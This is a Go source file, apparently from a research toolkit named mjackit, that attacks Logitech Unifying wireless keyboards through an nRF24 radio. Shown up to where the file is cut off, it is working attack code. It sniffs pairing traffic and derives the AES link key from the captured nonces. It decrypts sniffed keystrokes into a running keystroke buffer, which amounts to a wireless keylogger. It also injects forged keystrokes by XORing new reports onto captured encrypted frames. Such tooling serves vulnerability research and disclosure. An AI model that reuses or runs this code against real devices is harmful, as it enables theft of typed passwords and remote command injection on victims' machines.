package unifying

import (
	"context"
	"crypto/aes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/mame82/mjackit/hid"
	"time"
)

const (
	PAIRING_REQ  byte = 0x5f
	PAIRING_RSP  byte = 0x1f
	PAIRING_RSP3 byte = 0x0f
	//Assumption on pairing command
	// bit 0 = follow up traffic
	// bit 1 ??
	// bit 2 = req if enabled, response if disabled
	// bit 3 ???
	// bit 4..7 always 0xf

	PAIRING_PHASE0            byte = 0x00
	PAIRING_PHASE_TRANSITION1 byte = 0x10
	PAIRING_PHASE1            byte = 0x01
	PAIRING_PHASE_TRANSITION2 byte = 0x20
	PAIRING_PHASE2            byte = 0x02
	PAIRING_PHASE_TRANSITION3 byte = 0x30
	PAIRING_PHASE3            byte = 0x03
	PAIRING_FINISHED          byte = 0x40

	WPID_DONGLE_MSB byte = 0x88
	WPID_DONGLE_LSB byte = 0x02

	PROTO = 0x04
)

type LogitechDeviceType byte

const (
	LOGITECH_DEVICE_KEYBOARD  LogitechDeviceType = 0x01
	LOGITECH_DEVICE_MOUSE     LogitechDeviceType = 0x02
	LOGITECH_DEVICE_NUMPAD    LogitechDeviceType = 0x03
	LOGITECH_DEVICE_PRESENTER LogitechDeviceType = 0x04
	LOGITECH_DEVICE_REMOTE    LogitechDeviceType = 0x07
	LOGITECH_DEVICE_TRACKBALL LogitechDeviceType = 0x08
	LOGITECH_DEVICE_TOUCHPAD  LogitechDeviceType = 0x09
	LOGITECH_DEVICE_TABLET    LogitechDeviceType = 0x0a
	LOGITECH_DEVICE_GAMEPAD   LogitechDeviceType = 0x0b
	LOGITECH_DEVICE_JOYSTICK  LogitechDeviceType = 0x0c
)

type LogitechDeviceReportTypes uint32

const (
	LOGITECH_DEVICE_REPORT_TYPES_KEYBOARD     LogitechDeviceReportTypes = 1 << 1
	LOGITECH_DEVICE_REPORT_TYPES_MOUSE        LogitechDeviceReportTypes = 1 << 2
	LOGITECH_DEVICE_REPORT_TYPES_MULTIMEDIA   LogitechDeviceReportTypes = 1 << 3
	LOGITECH_DEVICE_REPORT_TYPES_POWER_KEYS   LogitechDeviceReportTypes = 1 << 4
	LOGITECH_DEVICE_REPORT_TYPES_MEDIA_CENTER LogitechDeviceReportTypes = 1 << 8
	LOGITECH_DEVICE_REPORT_TYPES_KEYBOARD_LED LogitechDeviceReportTypes = 1 << 14
	LOGITECH_DEVICE_REPORT_TYPES_SHORT_HIDPP  LogitechDeviceReportTypes = 1 << 16
	LOGITECH_DEVICE_REPORT_TYPES_LONG_HIDPP   LogitechDeviceReportTypes = 1 << 17
)



type LogitechDeviceCapabilities byte

const (
	LOGITECH_DEVICE_CAPS_LINK_ENCRYPTION     = LogitechDeviceCapabilities(1 << 0)
	LOGITECH_DEVICE_CAPS_UNIFYING_COMPATIBLE = LogitechDeviceCapabilities(1 << 2) // if not set pairing aborts with "not Unifying compatible"

	//Assumption on remaining bits (1 and 2):
	// - software enabled (DJ support)
	// - battery status support ?
	// - power switch position ??
)

type PairingPhase byte

const (
	PAIRING_PHASE_START      PairingPhase = 0x00
	PAIRING_PHASE_AFTER_REQ1 PairingPhase = 0x01
	PAIRING_PHASE_AFTER_RSP1 PairingPhase = 0x11
	PAIRING_PHASE_AFTER_REQ2 PairingPhase = 0x12
	PAIRING_PHASE_AFTER_RSP2 PairingPhase = 0x22
	PAIRING_PHASE_AFTER_REQ3 PairingPhase = 0x23
	PAIRING_PHASE_AFTER_RSP3 PairingPhase = 0x33
	PAIRING_PHASE_FINISHED   PairingPhase = 0x33
)

type LogitackerWpid [2]byte
type AesBlock [16]byte
type LogitackerNonce [4]byte
type LogitackerSerial [4]byte

type LogitackerDevice struct {
	//Mode LogitackerDeviceMode
	RfAddress   Nrf24Addr //==serial
	DevWPID     LogitackerWpid
	DevSerial   LogitackerSerial
	DongleWPID  LogitackerWpid
	Key         AesBlock
	AesIndata   AesBlock
	Counter     uint32
	DevType     LogitechDeviceType
	DevCaps     LogitechDeviceCapabilities
	DevNonce    LogitackerNonce
	DongleNonce LogitackerNonce
	DevName     string

	keyPresent bool

	PairingSeq   byte //Sequence number used in individual pairing phases
	PairingPhase PairingPhase

	EncryptedKeyboardFramesWhitened [][]byte //array of encrypted keyboard RF frames with payload whitened out and successive counters
	nextWhitenedFrameIdx            int
}

func (d *LogitackerDevice) GetNextWhitenedXORFrame() (frame []byte) {
	if d.EncryptedKeyboardFramesWhitened == nil || len(d.EncryptedKeyboardFramesWhitened) == 0 {
		// add dummy
		frame = make([]byte, 22)
		return //return dummy
	}

	next := d.EncryptedKeyboardFramesWhitened[d.nextWhitenedFrameIdx]
	d.nextWhitenedFrameIdx++
	if d.nextWhitenedFrameIdx >= len(d.EncryptedKeyboardFramesWhitened) {
		d.nextWhitenedFrameIdx = 0
	}

	frame = make([]byte, len(next))
	copy(frame, next)
	return
}

func (dev *LogitackerDevice) CaptureAndWhitenEncryptedXORFrames(ctx context.Context, lt *Logitacker, debug bool) (err error) {
	guesser := EncrypteReportTypeGuesser{}

	// Callback with report validation (checks if LED is toggled and whitens XOR encryption)
	callbackVariant1 := func(device *LogitackerDevice, frameTimeDuration time.Duration, pay []byte, class RFFrameType) (goOn bool) {

		fullSequenceObtained := guesser.AppendReport(class, pay, frameTimeDuration)
		if (debug) {
			fmt.Println(guesser.String())
		}
		fmt.Println(guesser.ProgresString())
		if fullSequenceObtained {
			//whitenedReports = guesser.WhitenedResult()
			dev.EncryptedKeyboardFramesWhitened = guesser.WhitenedResult() //store whitened frames to device data for re-use
			return false
		}

		return true
	}

	/* Capture part */

	// Capture LED toggling encrypted keystrokes and whiten them (with callback from above)
	// but only if whitened frames haven't been stored for the device, yet
	if dev.EncryptedKeyboardFramesWhitened == nil || len(dev.EncryptedKeyboardFramesWhitened) == 0 {
		fmt.Println("waiting for keystrokes to break encryption data")
		err = lt.CaptureDevice(ctx, dev, false, []RFFrameType{FT_SET_KEEP_ALIVE, FT_KEYBOARD_ENCRYPTED, FT_LED_REPORT}, callbackVariant1)
	} else {
		fmt.Println("enough keystrokes stored for device, to break encryption")
	}

	return
}

func (dev *LogitackerDevice) SendReportsWithWhitenedXOR(lt *Logitacker, keyboardReports []hid.KeyboardOutReport) (err error) {
	if dev.EncryptedKeyboardFramesWhitened == nil || len(dev.EncryptedKeyboardFramesWhitened) == 0 {
		return errors.New("No whitened frames available")
	}

	sleepBetweenFrames := time.Millisecond * 8

	for _, keyboardReport := range keyboardReports {
		pay := dev.GetNextWhitenedXORFrame()

		// XOR new report (keys and modifier) onto next whitened encrypted RF frame whitened frame
		pay[2] ^= byte(keyboardReport.Modifiers)
		for k := 0; k < 6; k++ {
			pay[3+k] ^= byte(keyboardReport.Keys[k])
		}
		LogitechChecksum(pay) //Fix RF frame checksum

		//Transmit payload, re-scan for correct channel if first transmission attempt fails
		_, eTx := lt.Nrf24.TransmitPayload(pay, 3, 15)
		if eTx != nil {
			lt.FindDevice(context.Background(), dev.RfAddress)
			lt.Nrf24.TransmitPayload(pay, 3, 15)
		}

		time.Sleep(sleepBetweenFrames)

		/*
		//send next frame unmodified (key release)
		lt.Nrf24.TransmitPayload(dev.GetNextWhitenedXORFrame(), 2, 15)
		time.Sleep(sleepBetweenFrames)
		*/
	}

	return
}

/*
func (d *LogitackerDevice) String() string {
	panic("implement me")
}
*/

func (d *LogitackerDevice) SetKey(key []byte) {
	copy(d.Key[:], key)
	d.keyPresent = true
}

func (d *LogitackerDevice) UnsetKey() {
	d.keyPresent = false
}

func (d *LogitackerDevice) HasKey() bool {
	return d.keyPresent
}

func (d *LogitackerDevice) DecryptKeyboardPayload(frame []byte) (result LogitackerUnecryptedKeyboardReport, err error) {
	ft := ClassifyRFFrame(frame)

	if ft == FT_KEYBOARD && len(frame) == 10 {
		//unencrypted, convert to decrypt anyways, to be able to use the to String method
		copy(result[:], frame[2:9])
		result[7] = 0xc9
		return
	}

	if ft != FT_KEYBOARD_ENCRYPTED {
		return result, errors.New(fmt.Sprintf("wrong frame type: %s", ft.String()))
	}

	if !d.HasKey() {
		return result, errors.New("device key not known, can't decrypt")
	}

	//extract counter
	counter := frame[10:14]
	aesin := CalculateAESIndata(counter)
	cipher := EncryptAes128Ecb(aesin, d.Key[:])
	cipher = cipher[:8]

	cryptPay := make([]byte, 8)
	copy(cryptPay, frame[2:])
	//result = make([]byte, 8)
	for idx, cipher_byte := range cipher {
		result[idx] = cipher_byte ^ cryptPay[idx]
	}

	if result[7] != 0xc9 {
		return result, errors.New("decryption error")
	}

	return
}

func (d *LogitackerDevice) EncryptKeyboardPayload(rawpay []byte, counter []byte) (result []byte) {
	result = []byte{0x00, 0xd3, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c}
	unencrypted := make([]byte, 8)
	unencrypted[7] = 0xc9
	copy(unencrypted[0:7], rawpay)

	//extract counter
	copy(result[10:14], counter)
	aesin := CalculateAESIndata(counter)
	cipher := EncryptAes128Ecb(aesin, d.Key[:])
	cipher = cipher[:8]

	cryptPay := make([]byte, 8)
	for idx, cipher_byte := range cipher {
		cryptPay[idx] = cipher_byte ^ unencrypted[idx]
	}

	copy(result[2:], cryptPay)

	LogitechChecksum(result)

	return
}

func (d *LogitackerDevice) EncryptKeyboardRawReport(unencrypted LogitackerUnecryptedKeyboardReport, counter []byte) (result []byte) {
	result = []byte{0x00, 0xd3, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c}
	unencrypted[7] = 0xc9

	//extract counter
	copy(result[10:14], counter)
	aesin := CalculateAESIndata(counter)
	cipher := EncryptAes128Ecb(aesin, d.Key[:])
	cipher = cipher[:8]

	cryptPay := make([]byte, 8)
	for idx, cipher_byte := range cipher {
		cryptPay[idx] = cipher_byte ^ unencrypted[idx]
	}

	copy(result[2:], cryptPay)

	LogitechChecksum(result)

	return
}

func (d *LogitackerDevice) ParsePairingFrame(pay []byte, debug bool) {
	//ToDo: implement parsing, succeed if all key data is present
	ft := ClassifyRFFrame(pay)
	if debug {
		fmt.Printf("% 02x %s\n", pay, ft.String())
	}
	switch ft {
	case FT_PAIRING_REQ_PHASE1:
		d.PairingSeq = pay[0]
		d.DevWPID = [2]byte{pay[9], pay[10]}
		d.DevType = LogitechDeviceType(pay[13])
		d.DevCaps = LogitechDeviceCapabilities(pay[14])
		d.PairingPhase &= 0xf0
		d.PairingPhase |= 0x01
		fmt.Println("Parsed pairing request 1")
	case FT_PAIRING_RSP_PHASE1:
		if d.PairingSeq == pay[0] && d.PairingPhase&0x01 == 0x01 {
			d.DongleWPID = [2]byte{pay[9], pay[10]}
			d.RfAddress = Nrf24Addr(pay[3:8])
			d.PairingPhase &= 0x0f
			d.PairingPhase |= 0x10
			fmt.Println("Parsed pairing response 1")
		}
	case FT_PAIRING_REQ_PHASE2:
		if d.PairingPhase == PAIRING_PHASE_AFTER_RSP1 {
			d.PairingSeq = pay[0]
			d.DevNonce = [4]byte{pay[3], pay[4], pay[5], pay[6]}
			d.DevSerial = [4]byte{pay[7], pay[8], pay[9], pay[10]}
			d.PairingPhase &= 0xf0
			d.PairingPhase |= 0x02
			fmt.Println("Parsed pairing request 2")
		}
	case FT_PAIRING_RSP_PHASE2:
		if d.PairingSeq == pay[0] && d.PairingPhase&0x02 == 0x02 {
			d.DongleNonce = [4]byte{pay[3], pay[4], pay[5], pay[6]}
			d.PairingPhase &= 0x0f
			d.PairingPhase |= 0x20

			//We have all data to calculate the link key
			key := CalculateLinkKey(d.RfAddress[0:5], d.DevWPID[:], d.DongleWPID[:], d.DevNonce[:], d.DongleNonce[:])
			//copy(d.Key[:], key)
			d.SetKey(key)
			fmt.Println("Parsed pairing response 2")
			if debug {
				fmt.Printf("Key: % 02x\n", d.Key)
			}

			fmt.Println("Encryption key calculated")
		}
	case FT_PAIRING_REQ_PHASE3:
		if d.PairingPhase == PAIRING_PHASE_AFTER_RSP2 {
			d.PairingSeq = pay[0]

			namelen := int(pay[4])
			d.DevName = string(pay[5 : 5+namelen]) //We don't check for out of bounds access (as investigated firmware doesn't ;-))

			d.PairingPhase &= 0xf0
			d.PairingPhase |= 0x03
			fmt.Println("Parsed pairing request 3")
		}
	case FT_PAIRING_RSP_PHASE3:
		if d.PairingSeq == pay[0] && d.PairingPhase&0x03 == 0x03 {

			d.PairingPhase &= 0x0f
			d.PairingPhase |= 0x30

			fmt.Println("Parsed pairing response 3")
			if debug {
				fmt.Printf("Device: %+v\n", d)
			}

		}

	}
}

type Logitacker struct {
	Nrf24             *NRF24
	Channels          []byte
	CurrentChannelIdx int

	keyboard *hid.HIDKeyboard

	KnownDevices map[string]*LogitackerDevice
}

func (lt *Logitacker) GetChannel() (ch byte) {
	if lt.Channels == nil {
		return 0
	}
	return lt.Channels[lt.CurrentChannelIdx]
}

func (lt *Logitacker) NextChannel() {
	lt.CurrentChannelIdx++
	lt.CurrentChannelIdx %= len(lt.Channels)
	lt.Nrf24.SetChannel(lt.Channels[lt.CurrentChannelIdx])
}

func (lt *Logitacker) InitChannelPreset(count byte) {
	hopDistance := byte(9)
	lowest := byte(5)
	chRange := (count) * 3
	lt.Channels = make([]byte, count)
	ch := lowest
	for i := byte(0); i < count; i++ {

		if ch > chRange {
			lowest += 3
			ch = lowest
		}
		lt.Channels[i] = ch
		ch += hopDistance
	}

}

//05 14 32 41 xx xx 08 17 35 44 xx xx

func (lt *Logitacker) InitChannelPresetLogitech12() {
	lt.InitChannelPreset(12) //Logitech device
}
func (lt *Logitacker) InitChannelPresetPairing() {
	lt.Channels = []byte{5, 32, 62, 35, 65, 14, 41, 71, 44, 74}
}

func (lt *Logitacker) InitChannelPresetLogitechOptimized() {
	lt.Channels = []byte{5, 14, 17, 20, 8, 11, 32, 35, 38, 41, 44, 29, 56, 47, 68, 71, 74, 59, 62, 65}
}

func (lt *Logitacker) InitChannelPresetLogitech26() {
	lt.InitChannelPreset(26) //Logitech device
}

func (lt *Logitacker) InitChannelPresetAll() {
	lt.Channels = make([]byte, 125)
	for i := byte(1); i < byte(len(lt.Channels)); i++ {
		lt.Channels[i] = i
	}
}

func (lt *Logitacker) ValidateDongleForPotentialDevice(rcvdPay []byte, attempts int) (valid bool) {
	//first 5 bytes form device addresss
	if len(rcvdPay) < 5 {
		return false
	}

	addrDev := Nrf24Addr{rcvdPay[0], rcvdPay[1], rcvdPay[2], rcvdPay[3], rcvdPay[4]}
	addrDongle := Nrf24Addr{rcvdPay[0], rcvdPay[1], rcvdPay[2], rcvdPay[3], 0x00}

	fmt.Printf("Try to find dongle for potential device %s...\n", addrDev)

	//Try to reach dongle address on all channels
	lt.Nrf24.EnterSnifferMode(addrDongle, true)
	defer lt.Nrf24.EnterPromiscuousMode()
	//lt.CurrentChannelIdx = 0
	for i := 0; i < len(lt.Channels)*attempts; i++ {
		ack, ackErr := lt.Nrf24.TransmitPayload([]byte{}, 4, 15)
		if ackErr == nil {
			if len(ack) > 0 {
				fmt.Printf("Received ack from dongle %s on channel %d, content: % 02x\n", addrDongle.String(), lt.GetChannel(), ack)
			} else {
				fmt.Printf("Received empty ack from dongle %s on channel %d\n", addrDongle.String(), lt.GetChannel())
			}

			return true
		}

		lt.NextChannel()
	}

	fmt.Printf("No dongle found, considering device %s invalid\n", addrDev)

	return false
}

func (lt *Logitacker) FindDongleInPairingMode() (channel byte, err error) {

	/*
	//0xAA = Pairing seq ID, 0xBB bytes of current (old) device address, 0x08 keep alive interval ?, 0xCC device WPID, 0x04 proto, 0x02 unknown, 0xDD device type, 0xEE device caps ??
	payPin := []byte{
		0xAA,
		PAIRING_REQ, PAIRING_PHASE1,
		0xDE, 0xAD, 0xBE, 0xEF, 0xAA,
		0x14,
		0x20, 0x11, //WPID
		0x04,
		0x02,
		byte(LOGITECH_DEVICE_REMOTE),
		byte(LOGITECH_DEVICE_CAPS_UNIFYING_COMPATIBLE),
		0xEE,
		0x00, 0x00, 0x00, 0x00, 0x00, 0xa5,
	}
	*/
	payPin := []byte{0x00}
	LogitechChecksum(payPin)
	//fmt.Printf("Try to find dongle in pairing mode...\n")

	//Try to reach dongle address on all channels
	//lt.Nrf24.EnterSnifferMode(LogitechPairingAddr, false)
	//lt.CurrentChannelIdx = 0
	for i := 0; i < len(lt.Channels)*3; i++ {
		ack, ackErr := lt.Nrf24.TransmitPayload(payPin, 0, 0)
		if ackErr == nil {
			if len(ack) > 0 {
				//		fmt.Printf("Found dongle in pairing mode on channel %d, received data: % 02x\n", lt.GetChannel(), ack)
			} else {
				//		fmt.Printf("Found dongle in pairing mode on channel %d\n", lt.GetChannel())
			}

			return lt.GetChannel(), nil
		}

		lt.NextChannel()
	}

	return 0, errors.New("Not found in this run")
}
func (lt *Logitacker) FindDevice(ctx context.Context, addr Nrf24Addr) (channel byte, err error) {
	payPin := []byte{0x00}
	LogitechChecksum(payPin)
	for i := 0; i < len(lt.Channels)*3; i++ {
		_, ackErr := lt.Nrf24.TransmitPayload(payPin, 0, 0)
		if ackErr == nil {
			return lt.GetChannel(), nil
		}

		lt.NextChannel()
	}

	return 0, errors.New("Not found in this run")
}

func (lt *Logitacker) SniffPairing(debug bool) (pays [][]byte, device *LogitackerDevice, err error) {
	pays = make([][]byte, 0)

	lt.InitChannelPresetPairing()

	fmt.Println("Wait for dongle in pairing mode")
	lt.Nrf24.EnterSnifferMode(LogitechPairingAddr, false)

	chanSpotted := byte(0)
	//	timeSpotted := time.Now()
	lastScan := time.Now()
	device = &LogitackerDevice{}
	for {
		c, notfound := lt.FindDongleInPairingMode()
		if notfound == nil {
			if c != chanSpotted {
				//				fmt.Printf("Channel change to %d after %v\n", c, time.Since(timeSpotted))
				fmt.Printf("%d, ", c)

				//				timeSpotted = time.Now()
				chanSpotted = c

			}
			//break

			//dongle found on this channel, read data for 10ms, before rechecking channel
			stay := true
			reads := 0
			lockChannel := false
			phase1AckPullCount := 0
			phase2AckPullCount := 0
			phase3AckPullCount := 0

			for stay || lockChannel {

				p, eNoPay := lt.Nrf24.ReceivePayload()
				if eNoPay == nil && len(p) > 1 {
					pay := p[1:]
					pays = append(pays, pay)
					//fmt.Printf("\n================================\nPay: % 02x\n", pay)
					device.ParsePairingFrame(pay, debug) //test RF payload to be part of pairing and update device data accordingly
					lockChannel = true
					if pay[1] == 0x1f && pay[2] == 0x01 {
						//Pairing response phase 1 initiates address change

						//change address to follow
						addr := Nrf24Addr{pay[3], pay[4], pay[5], pay[6], pay[7]}
						lt.Nrf24.EnterSnifferMode(addr, false)
						lockChannel = false
						fmt.Println("Switched addr", addr.String())
					} else if pay[1] == 0x4f && pay[2] == 0x06 {
						//check if all relevant pairing frames are parsed and add device entry if so
						fmt.Println("Final request")
						if device.PairingPhase == PAIRING_PHASE_FINISHED {
							//add to known device
							lt.KnownDevices[device.RfAddress.String()] = device
							return pays, device, nil
						} else {
							return pays, nil, errors.New("Parts of pairing missed")
						}

						//Final pairing request, we don't care for the reply

					} else if pay[1] == 0x40 && pay[2] == 0x01 {
						//Ack pull phase 1, if we receive too many, the phase 1 request is likely lost
						//lets us count them to opt out on a threshold of 6
						phase1AckPullCount++
						if phase1AckPullCount > 5 {
							return pays, nil, errors.New("Parts of pairing missed, too many phase 1 AckkPulls")
						}
					} else if pay[1] == 0x40 && pay[2] == 0x02 {
						//Ack pull phase 1, if we receive too many, the phase 1 request is likely lost
						//lets us count them to opt out on a threshold of 6
						phase2AckPullCount++
						if phase2AckPullCount > 5 {
							return pays, nil, errors.New("Parts of pairing missed, too many phase 2 AckkPulls")
						}
					} else if pay[1] == 0x40 && pay[2] == 0x03 {
						//Ack pull phase 1, if we receive too many, the phase 1 request is likely lost
						//lets us count them to opt out on a threshold of 6
						phase3AckPullCount++
						if phase3AckPullCount > 5 {
							return pays, nil, errors.New("Parts of pairing missed, too many phase 3 AckkPulls")
						}
					}
				} else {
					reads++
					if reads > 10 {
						stay = false
					}

				}
			}

		}

		if time.Since(lastScan) > time.Second {
			fmt.Printf(".")
			lastScan = time.Now()
		}

	}

}

func CalculateAESIndata(counter []byte) (aesindata []byte) {
	aesindata = []byte{0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d, 0xdf, 0x7c, 0x2d, 0xeb, 0x0a, 0x0d, 0x13, 0x26, 0x0e}
	copy(aesindata[7:11], counter)
	return
}

func CalculateLinkKey(dongleSerial []byte, deviceWPID []byte, dongleWPID []byte, deviceNonce []byte, dongleNonce []byte) (key []byte) {
	keydata := make([]byte, 16)

	//!!hard!! to sniff pairing data
	copy(keydata[0:4], dongleSerial)  //Pairing response phase 1 or already leaked in request
	copy(keydata[4:6], deviceWPID)    //Pairing request phase 1
	copy(keydata[6:8], dongleWPID)    //Pairing response phase 1
	copy(keydata[8:12], deviceNonce)  //Pairing request phase 2
	copy(keydata[12:16], dongleNonce) //Pairing response phase 2

	//fmt.Printf("Raw keydata: % 02x\n", keydata)

	//really !!complex!! key derivation
	key = make([]byte, 16)
	key[2] = keydata[0]
	key[1] = keydata[1] ^ 0xff
	key[5] = keydata[2] ^ 0xff
	key[3] = keydata[3]
	key[14] = keydata[4]
	key[11] = keydata[5]
	key[9] = keydata[6]
	key[0] = keydata[7]
	key[8] = keydata[8]
	key[6] = keydata[9] ^ 0x55
	key[4] = keydata[10]
	key[15] = keydata[11]
	key[10] = keydata[12] ^ 0xff
	key[12] = keydata[13]
	key[7] = keydata[14]
	key[13] = keydata[15] ^ 0x55

	return
}

/*
func (lt *Logitacker) SniffDevice(ctx context.Context, device *LogitackerDevice, blacklist bool, filterList []RFFrameType) {
	//convert filterlist to map
	filterMap := make(map[RFFrameType]bool)
	for _,rftype := range filterList {
		filterMap[rftype] = true
	}

	address := device.RfAddress
	run := true

	//watch context
	go func() {
		select {
		case <-ctx.Done():
			run = false
		}
	}()

	lt.InitChannelPresetLogitechOptimized()
	lt.Nrf24.EnterSnifferMode(address, false) //we are passive, so no acks

	//ToDo: if keep alive frames are sniffed, scale rescanDelay dynamically to match
	//ToDo: Test if dongle in pairing mode could be pinned with keep alive frame (not observed as valid payload type during pairing, but try)

	startTime := time.Now()
	reScanDelayIfNoFrames := time.Millisecond * 1200 //Keep alive interval for idle keyboard is 0x044c
	for run {
		//find device
		ch, eFind := lt.FindDevice(ctx, address)
		if eFind == nil {
			fmt.Printf("\nFound dongle for device %s on channel %02d, waiting for traffic\n", address, ch)
			findAgain := false
			timeFound := time.Now()
			for run && !findAgain {
				p, eRead := lt.Nrf24.ReceivePayload()
				if eRead == nil && len(p) > 1 {
					pay := p[1:]
					class := ClassifyRFFrame(pay)
					// Special case:
					// if a packet has an invalid checksum, len 22 and RF type 0x40 it has likely be to concatenated with the follow up frame

					printFrame := false
					if blacklist {
						if !filterMap[class] {
							printFrame = true
						}
					} else {
						//whitelist
						if filterMap[class] {
							printFrame = true
						}
					}

					//if (!dontPrintKeepAlive || class != FT_NOTIFICATION_KEEP_ALIVE) && class != FT_INVALID_CHKSM {
					if printFrame {
						//fmt.Printf("Pay (addr %s, len %d, ch %d, type: %s):\n\t % 02x\n", address, len(pay), ch, class, pay)
						frameTime := time.Since(startTime).Nanoseconds()
						payStr := fmt.Sprintf("%02X", pay)
						fmt.Printf("%-11.4f %-44s    %s (len %d)\n", float32(frameTime) / 1e6, payStr, class, len(pay))
						if class == FT_KEYBOARD_ENCRYPTED {
							if decrypt,eDecrypt := device.DecryptKeyboardPayload(pay); eDecrypt == nil {
								//fmt.Printf("DECRYPTED FRAME: % #02x\n", decrypt)
								fmt.Printf(" --> decrypted %s\n", decrypt.String())
							} else {
								fmt.Printf(" --> decryption failed: wrong or unknown key\n")
							}
						}
					}

					timeFound = time.Now()
				} else {
					if time.Since(timeFound) > reScanDelayIfNoFrames {
						findAgain = true
					}
				}
				//fmt.Printf("r")
			}

		} else {
			fmt.Printf(".") // indicates searching device on all channels
		}

	}
}
*/

func (lt *Logitacker) SniffDevice(ctx context.Context, device *LogitackerDevice, blacklist bool, filterList []RFFrameType) {
	lt.CaptureDevice(context.Background(), device, blacklist, filterList, CaptureCallbackPrint)
}

func (lt *Logitacker) SniffDeviceKeybuff(ctx context.Context, device *LogitackerDevice, blacklist bool, filterList []RFFrameType) {
	keybuff := ""
	lastReport := LogitackerUnecryptedKeyboardReport{}
	callback := func(device *LogitackerDevice, frameTimeDuration time.Duration, pay []byte, class RFFrameType) (goOn bool) {
		//fmt.Printf("Pay (addr %s, len %d, ch %d, type: %s):\n\t % 02x\n", address, len(pay), ch, class, pay)
		frameTime := frameTimeDuration.Nanoseconds()
		payStr := fmt.Sprintf("%02X", pay)
		fmt.Printf("%-11.4f %-44s    %s (len %d)\n", float32(frameTime)/1e6, payStr, class, len(pay))
		if class == FT_KEYBOARD_ENCRYPTED {
			if decrypt, eDecrypt := device.DecryptKeyboardPayload(pay); eDecrypt == nil {
				//fmt.Printf("DECRYPTED FRAME: % #02x\n", decrypt)
				fmt.Printf(" --> decrypted %s\n", decrypt.String())
				for i := 1; i < 7; i++ {
					//ignore keys which have been present in previous report
					if !lastReport.ContainsKey(decrypt[i]) {
						keybuff += hid.NaiveAsciiTransform(hid.HIDMod(decrypt[0]), hid.HIDKey(decrypt[i]))
					}
					//allow deletion with backspace
					if hid.HIDKey(decrypt[i]) == hid.HID_KEY_BACKSPACE && len(keybuff) > 0 {
						keybuff = keybuff[:len(keybuff)-1]
					}
				}
				lastReport = decrypt
				fmt.Println("Keybuff:\n-------\n", keybuff)
			} else {
				fmt.Printf(" --> decryption failed: wrong or unknown key\n")
			}
		}
		return true
	}

	lt.CaptureDevice(context.Background(), device, blacklist, filterList, callback)
}

type CaptureCallback func(device *LogitackerDevice, frameTime time.Duration, payload []byte, frameType RFFrameType) (goOn bool)

func CaptureCallbackPrint(device *LogitackerDevice, frameTimeDuration time.Duration, pay []byte, class RFFrameType) (goOn bool) {
	//fmt.Printf("Pay (addr %s, len %d, ch %d, type: %s):\n\t % 02x\n", address, len(pay), ch, class, pay)
	frameTime := frameTimeDuration.Nanoseconds()
	payStr := fmt.Sprintf("%02X", pay)
	fmt.Printf("%-11.4f %-44s    %s (len %d)\n", float32(frameTime)/1e6, payStr, class, len(pay))
	if class == FT_KEYBOARD_ENCRYPTED {
		if decrypt, eDecrypt := device.DecryptKeyboardPayload(pay); eDecrypt == nil {
			//fmt.Printf("DECRYPTED FRAME: % #02x\n", decrypt)
			fmt.Printf(" --> decrypted %s\n", decrypt.String())
		} else {
			fmt.Printf(" --> decryption failed: wrong or unknown key\n")
		}
	}
	if class == FT_KEYBOARD {
		if decrypt, eDecrypt := device.DecryptKeyboardPayload(pay); eDecrypt == nil {
			//fmt.Printf("DECRYPTED FRAME: % #02x\n", decrypt)
			fmt.Printf(" --> %s\n", decrypt.String())
		}
	}
	return true
}

func (lt *Logitacker) CaptureDevice(ctx context.Context, device *LogitackerDevice, blacklist bool, filterList []RFFrameType, callback CaptureCallback) (err error) {
	//convert filterlist to map
	filterMap := make(map[RFFrameType]bool)
	for _, rftype := range filterList {
		filterMap[rftype] = true
	}

	address := device.RfAddress
	run := true

	//watch context
	go func() {
		select {
		case <-ctx.Done():
			err = errors.New("aborted")
			run = false
		}
	}()

	lt.InitChannelPresetLogitechOptimized()
	lt.Nrf24.EnterSnifferMode(address, false) //we are passive, so no acks

	//ToDo: if keep alive frames are sniffed, scale rescanDelay dynamically to match
	//ToDo: Test if dongle in pairing mode could be pinned with keep alive frame (not observed as valid payload type during pairing, but try)

	startTime := time.Now()
	reScanDelayIfNoFrames := time.Millisecond * 1200 //Keep alive interval for idle keyboard is 0x044c
	for run {
		//find device
		ch, eFind := lt.FindDevice(ctx, address)
		if eFind == nil {
			fmt.Printf("\nFound dongle for device %s on channel %02d, waiting for traffic\n", address, ch)
			findAgain := false
			timeFound := time.Now()
			for run && !findAgain {
				p, eRead := lt.Nrf24.ReceivePayload()
				if eRead == nil && len(p) > 1 {
					pay := p[1:]
					class := ClassifyRFFrame(pay)
					// Special case:
					// if a packet has an invalid checksum, len 22 and RF type 0x40 it has likely be to concatenated with the follow up frame

					captureFrame := false
					if blacklist {
						if !filterMap[class] {
							captureFrame = true
						}
					} else {
						//whitelist
						if filterMap[class] {
							captureFrame = true
						}
					}

					//if (!dontPrintKeepAlive || class != FT_NOTIFICATION_KEEP_ALIVE) && class != FT_INVALID_CHKSM {
					if captureFrame {
						frameTime := time.Since(startTime)

						if !callback(device, frameTime, pay, class) {
							return
						}
					}

					timeFound = time.Now()
				} else {
					if time.Since(timeFound) > reScanDelayIfNoFrames {
						findAgain = true
					}
				}
			}

		} else {
			fmt.Printf(".") // indicates searching device on all channels
		}

	}

	return
}

type LogitackerUnecryptedKeyboardReport [8]byte

func (r *LogitackerUnecryptedKeyboardReport) ContainsKey(key byte) bool {
	for i := 1; i < 7; i++ {
		if key == r[i] {
			return true
		}
	}
	return false
}

func (r *LogitackerUnecryptedKeyboardReport) String() string {
	activeModifiers := make([]hid.HIDMod, 0)
	modbyte := hid.HIDMod(r[0])
	testmodifiers := []hid.HIDMod{
		hid.HID_MOD_KEY_LEFT_CONTROL,
		hid.HID_MOD_KEY_LEFT_SHIFT,
		hid.HID_MOD_KEY_LEFT_ALT,
		hid.HID_MOD_KEY_LEFT_GUI,
		hid.HID_MOD_KEY_RIGHT_CONTROL,
		hid.HID_MOD_KEY_RIGHT_SHIFT,
		hid.HID_MOD_KEY_RIGHT_ALT,
		hid.HID_MOD_KEY_RIGHT_GUI,
	}
	modStr := ""
	for _, test := range testmodifiers {
		if modbyte&test > 0 {
